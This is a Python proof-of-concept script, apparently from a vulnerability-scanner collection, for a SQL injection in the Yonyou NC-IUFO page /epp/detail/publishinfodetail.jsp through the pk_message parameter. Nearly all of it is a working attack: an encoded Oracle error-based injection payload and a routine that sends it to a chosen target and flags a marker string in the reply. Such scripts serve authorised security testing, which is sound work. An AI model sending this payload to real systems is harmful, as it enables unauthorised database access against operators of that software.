# coding: utf-8
import requests

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'Yonyou_0103'  # 平台漏洞编号，留空
    name = '用友NC-IUFO系统 /epp/detail/publishinfodetail.jsp SQL注入'  # 漏洞名称
    level = VulnLevel.MED  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2015-04-01'  # 漏洞公布时间
    desc = '''
        用友是国内著名的内容管理系统之一，包括协同管理系统、用友NC、用友U8等
        param `pk_message` is not filterd,
        用友NC-IUFO系统 /epp/detail/publishinfodetail.jsp SQL注入。
    '''  # 漏洞描述
    ref = 'https://bugs.shuimugan.com/bug/view?bug_no=089208'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'Yonyou(用友)'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'a72a16bf-99ba-4baf-b55f-4c5bc200349f'  # 平台 POC 编号，留空
    author = 'hyhmnn'  # POC编写者
    create_date = '2018-05-29'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            url = self.target
            url = url if url[-1] != '/' else url[:-1]
            payload = ("/epp/detail/publishinfodetail.jsp?pk_message=1002F410000000019JNX%27%20"
                       "AND%203814=(SELECT%20UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(99)||"
                       "CHR(122)||CHR(103)||CHR(113)||(SELECT%20(CASE%20WHEN%20(3814=3814)%20THEN"
                       "%201%20ELSE%200%20END)%20FROM%20DUAL)||CHR(113)||CHR(110)||CHR(111)||CHR(105)"
                       "||CHR(113)||CHR(62)))%20FROM%20DUAL)%20AND%20%27vdoA%27=%27vdoA")
            verify_url = url + payload
            req = requests.get(verify_url)
            content = req.text
            if req.status_code == 500 and 'qczgq1qnoiq' in content:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常：{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
